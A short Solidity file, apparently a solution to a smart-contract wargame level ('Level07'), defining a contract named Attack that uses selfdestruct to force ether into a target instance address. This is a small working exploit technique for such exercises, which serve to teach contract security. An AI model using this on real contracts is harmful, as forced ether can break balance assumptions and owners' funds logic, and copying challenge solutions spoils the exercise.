// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Level07.sol";

contract Attack {
    function atatatak(address payable _instance) public payable {
        selfdestruct(_instance);
    }
}
